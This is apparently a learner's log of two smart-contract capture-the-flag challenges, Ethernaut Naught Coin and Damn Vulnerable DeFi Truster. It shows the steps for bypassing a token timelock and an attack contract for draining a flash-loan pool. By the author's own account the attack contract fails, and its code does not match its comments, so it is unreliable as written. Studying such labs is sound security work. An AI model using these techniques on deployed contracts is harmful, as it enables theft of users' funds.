## Day 14-15: ERC20

### Ethernaut #15 Naught Coin 

This is an ERC20 token and we own the full supply of these tokens, but we can only withdraw with the transfer() function after 10 years.  The challenge is to transfer the coins out before the lockout period.  Here is a shot of the transfer and lockTokens() functions.  

```Java

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  }
```

One possible exploit is to transfer the tokens using a different method than ```transfer()```, since this contract inherits all the ERC20 methods and only overrides ```transfer()```.  The other possible method is: ```transferFrom()```.  Two other accounts called ADDRESS_2, and ADDRESS_3, will be needed to accomplish this.  

This was accomplished with the following steps:

step 1. player approves ADDRESS_2 to spend INITIAL_SUPPLY tokens.  
step 2. ADDRESS_2 calls ```transferFrom(player, ADDRESS_3, INITIAL_SUPPLY)```.  



### Damn Vulnerable Defi #3 Truster

This is flah loan pool that lends out DVT tokens.  The objective is after starting with 0 tokens take all the tokens in the pool. The main flashLoan function is below: 

```Java
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
```

The main steps in the flash loan code are transfer() and then the target functionCall(), at first it appears that functionCall() is an interface for using the flash loan, however upon further inspection functionCall() is from OpenZeppelin utils in the Address.sol file.  Here is the relevant code: 

```Java
(bool success, bytes memory returndata) = target.call{value: value}(data);
```

This takes any contract we desire and calls any function we desire, very interesting.  With this knowledge we can attack the pool by not borrowing any tokens and instead using the function call to approve our contract to spend the external tokens.  A contract that does this is given below.  


```Java
contract Attack {
    TrusterLenderPool immutable pool;
    DamnValuableToken immutable token;
    uint256 constant MAX_UINT = type(uint256).max;

    constructor(address _poolAddress, address _tokenAdd) {
        pool = TrusterLenderPool(_poolAddress);
        token = DamnValuableToken(_tokenAdd);
    }

    function attack() external {
        // pack up the function call
        uint tokensToMove = token.balanceOf(address(pool));
        console.log("tokens to move: ", tokensToMove);
        bytes memory packedFtnCall = abi.encodeWithSignature("transfer(address, uint256)", msg.sender, tokensToMove); // this doesn't work
        // bytes memory packedFtnCall = abi.encodeWithSignature("balanceOf(address)", address(pool));  // this works

        // borrow 0 tokens so we don't have to worry about returning them.  
        pool.flashLoan(0, msg.sender, address(token), packedFtnCall);

        // now that we have the approval transfer the tokens to the boss
        // token.transferFrom(address(pool), msg.sender, tokensToMove);
    }
}
```

This fails if ```approve()``` or ```transfer()``` are called.  It's not completely clear to me why it fails, it is failing during the OpenZeppelin ```verifyCallResult()``` in Oz/contracts/utils/Address.sol.
